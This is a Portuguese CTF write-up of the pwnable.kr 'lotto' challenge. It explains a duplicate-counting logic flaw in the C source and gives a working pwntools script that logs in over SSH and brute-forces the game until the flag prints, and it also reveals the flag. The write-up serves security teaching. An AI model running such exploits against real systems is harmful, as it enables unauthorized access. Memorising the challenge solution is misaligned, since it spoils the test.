# bof
###### Resolvido por @Menegaldo
> Este é um CTF sobre [Operating logic]

## Sobre o Desafio  

Mamãe! Fiz um programa de loteria para meu dever de casa.
você quer jogar?

ssh lotto@pwnable.kr -p2222 (pw:guest)

## 🔗 Links do Desafio

- [Exercício](https://pwnable.kr/play.php#)

## Solução

O desafio proposto fornece as seguintes informações: uma pessoa criou um jogo de loteria e concedeu acesso a um servidor SSH. Dentro desse servidor, há três arquivos: lotto, lotto.c e flag.

![image](https://github.com/user-attachments/assets/afd67885-fbed-4b0d-92bf-46c9e5cc03a9)

O arquivo lotto.c contém o código-fonte do jogo, responsável pela mecânica da loteria.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

O código acima define a função play(), responsável pelo jogo de loteria.

A entrada dos números da loteria é processada por este trecho:

```c
int i;
printf("Submit your 6 lotto bytes : ");
fflush(stdout);
int r;
r = read(0, submit, 6);
```

Aqui, o usuário insere 6 números, armazenados no array submit. O comando read(0, submit, 6) lê 6 bytes da entrada padrão (stdin).

O código gera números aleatórios usando /dev/urandom:

```c
int fd = open("/dev/urandom", O_RDONLY);
if(fd==-1){
        printf("error. tell admin\n");
        exit(-1);
}
```

Os 6 bytes aleatórios são lidos e armazenados no array lotto:

```c
unsigned char lotto[6];
if(read(fd, lotto, 6) != 6){
        printf("error2. tell admin\n");
        exit(-1);
}
```

Os números são então convertidos para valores entre 1 e 45:

```c
for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;
}
```

A vulnerabilidade lógica está na verificação dos números correspondentes. O código conta quantas vezes um número do usuário (submit) aparece no array lotto, permitindo contagens repetidas:

```c
int match = 0, j = 0;
for(i=0; i<6; i++){
        for(j=0; j<6; j++){
                if(lotto[i] == submit[j]){
                        match++;
                }
        }
}
```

Caso o usuário acerte 6 números (considerando a falha na contagem), o programa exibe o conteúdo do arquivo flag:

```c
if(match == 6){
        system("/bin/cat flag");
}
else{
        printf("bad luck...\n");
}
```

Se os números não forem todos reconhecidos, a mensagem "bad luck..." é exibida.

Com base nessa falha, é possível aumentar as chances de ganhar. O código a seguir automatiza essa tentativa:

```python
from pwn import *

sh = ssh('lotto', '128.61.240.205', password='guest', port=2222)
p = sh.process('./lotto')

for i in range(1000):
    p.recv()
    p.sendline(b'1')
    p.recv()
    p.sendline(b'------')
    _, ans = p.recvlines(2)
    
    if b"bad" not in ans:
        print(ans.decode())
        break
```

O script Python estabelece uma conexão com o servidor SSH utilizando as credenciais fornecidas e, em seguida, executa o programa lotto. Para explorar a vulnerabilidade identificada, ele repete o processo de jogo mil vezes. A cada iteração, o script envia o número 1 para selecionar a opção de jogar e insere a sequência de caracteres b'------' como entrada, aproveitando a falha na contagem de números repetidos. Após cada tentativa, a resposta do programa é analisada para verificar se a mensagem "bad luck" está presente. Caso essa mensagem não apareça, significa que o exploit funcionou e a flag foi obtida, encerrando o loop imediatamente.

![image](https://github.com/user-attachments/assets/dd178db0-a2e6-4e21-9d64-56ed4e3e150f)

> Assim, obtemos a flag `sorry mom... I FORGOT to check duplicate numbers... :(`
